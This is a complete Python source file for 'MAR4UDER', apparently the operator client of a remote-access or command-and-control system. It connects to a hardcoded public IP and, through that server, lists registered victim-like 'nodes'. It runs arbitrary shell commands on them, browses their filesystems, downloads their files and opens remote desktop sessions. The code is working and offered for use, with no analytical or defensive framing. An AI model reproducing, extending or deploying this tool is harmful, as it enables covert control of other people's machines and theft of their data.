#!/usr/bin/env python3
"""
MAR4UDER Operator & Management CLI (command.py)
Direct REST & TCP Operator utility
"""

import sys
import os
import json
import socket
import threading
import urllib.request
import urllib.error

SERVER_HOST = os.environ.get("MAR4UDER_HOST", "104.143.206.163")
SERVER_HTTP_PORT = os.environ.get("MAR4UDER_HTTP_PORT", "8080")
SERVER_NC_PORT = int(os.environ.get("MAR4UDER_NC_PORT", "9000"))
API_URL = f"http://{SERVER_HOST}:{SERVER_HTTP_PORT}/api/v1"


def print_help():
    print(f"\n\033[1;36mMAR4UDER // Management Utility (command.py)\033[0m")
    print(f"Target Server: {SERVER_HOST} (API: {SERVER_HTTP_PORT}, Console: {SERVER_NC_PORT})\n")
    print("Usage:")
    print("  python command.py                         - Interactive Netcat Operator Console")
    print("  python command.py list                    - List all registered nodes & status")
    print("  python command.py <node_id> \"<cmd>\"       - Execute command on node")
    print("  python command.py fs <node_id> [path]     - Explore filesystem on node")
    print("  python command.py get <node_id> <remote>  - Download file from node")
    print("  python command.py vnc <node_id>           - Open Web Desktop in browser\n")


def list_nodes():
    url = f"{API_URL}/nodes"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "m4r-cli"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if not data:
                print("[-] No nodes registered.")
                return
            print(f"\n{'SLOT':<6} {'NODE ID':<18} {'STATUS':<10} {'HOSTNAME':<22} {'REMOTE ADDR':<24} {'VNC':<12} {'NOTE'}")
            print("-" * 105)
            for n in data:
                is_on = n.get("is_online", False)
                st = "\033[32mONLINE\033[0m" if is_on else "\033[31mOFFLINE\033[0m"
                slot = n.get("slot", "-")
                nid = n.get("id", "")
                host = n.get("hostname", "")
                addr = n.get("remote_addr", "")
                vnc = f"{n.get('vnc_engine', 'custom')}:{n.get('vnc_port', 5900)}"
                note = n.get("note", "")
                print(f"{slot:<6} {nid:<18} {st:<19} {host:<22} {addr:<24} {vnc:<12} {note}")
            print()
    except Exception as e:
        print(f"[-] Error querying API: {e}")


def exec_cmd(node_id, cmd, timeout=10):
    url = f"{API_URL}/nodes/{node_id}/cmd"
    payload = json.dumps({"command": cmd, "timeout": timeout}).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "m4r-cli"}, method="POST")
        with urllib.request.urlopen(req, timeout=timeout + 5) as resp:
            res = json.loads(resp.read().decode("utf-8"))
            out = res.get("output", "")
            if out:
                print(out)
            else:
                print(json.dumps(res, indent=2))
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8', errors='ignore')}")
    except Exception as e:
        print(f"[-] Exec error: {e}")


def list_fs(node_id, path="/"):
    url = f"{API_URL}/nodes/{node_id}/fs?path={urllib.request.quote(path)}"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "m4r-cli"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            print(f"\nListing: {data.get('current_path', path)}")
            print(f"{'PERM':<12} {'TYPE':<8} {'SIZE':<12} {'NAME'}")
            print("-" * 55)
            for e in data.get("entries", []):
                t = "DIR" if e.get("is_dir") else "FILE"
                print(f"{e.get('perm', ''):<12} {t:<8} {e.get('size', 0):<12} {e.get('name', '')}")
            print()
    except Exception as e:
        print(f"[-] FS list error: {e}")


def download_file(node_id, remote_path, local_dest=None):
    if not local_dest:
        local_dest = os.path.basename(remote_path)
    url = f"{API_URL}/nodes/{node_id}/download"
    payload = json.dumps({"remote_path": remote_path}).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "m4r-cli"}, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            res = json.loads(resp.read().decode("utf-8"))
            file_id = res.get("file_id")
            if not file_id:
                print(f"[-] Download failed: {res}")
                return
        
        file_url = f"{API_URL}/files/{file_id}"
        urllib.request.urlretrieve(file_url, local_dest)
        print(f"\033[32m[+] Successfully downloaded to: {local_dest}\033[0m")
    except Exception as e:
        print(f"[-] Download error: {e}")


def interactive_console(host=SERVER_HOST, port=SERVER_NC_PORT):
    print(f"\033[1;36m[*] Connecting to MAR4UDER Console ({host}:{port}) ...\033[0m")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        return

    running = True

    def reader():
        nonlocal running
        try:
            while running:
                data = s.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", errors="replace"))
                sys.stdout.flush()
        except Exception:
            pass
        running = False

    t = threading.Thread(target=reader, daemon=True)
    t.start()

    try:
        while running:
            line = sys.stdin.readline()
            if not line:
                break
            s.sendall(line.encode("utf-8"))
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        s.close()
        print("\n[*] Disconnected.")


def main():
    if len(sys.argv) < 2:
        interactive_console()
        return

    cmd = sys.argv[1].lower()

    if cmd in ("list", "ls", "nodes"):
        list_nodes()
    elif cmd in ("help", "-h", "--help"):
        print_help()
    elif cmd == "fs":
        if len(sys.argv) < 3:
            print("[-] Usage: python command.py fs <node_id> [path]")
            return
        node_id = sys.argv[2]
        path = sys.argv[3] if len(sys.argv) > 3 else "/"
        list_fs(node_id, path)
    elif cmd in ("get", "download"):
        if len(sys.argv) < 4:
            print("[-] Usage: python command.py get <node_id> <remote_path> [local_dest]")
            return
        node_id = sys.argv[2]
        remote = sys.argv[3]
        local = sys.argv[4] if len(sys.argv) > 4 else None
        download_file(node_id, remote, local)
    elif cmd == "console":
        interactive_console()
    elif len(sys.argv) >= 3:
        node_id = sys.argv[1]
        user_cmd = sys.argv[2]
        exec_cmd(node_id, user_cmd)
    else:
        interactive_console()


if __name__ == "__main__":
    main()
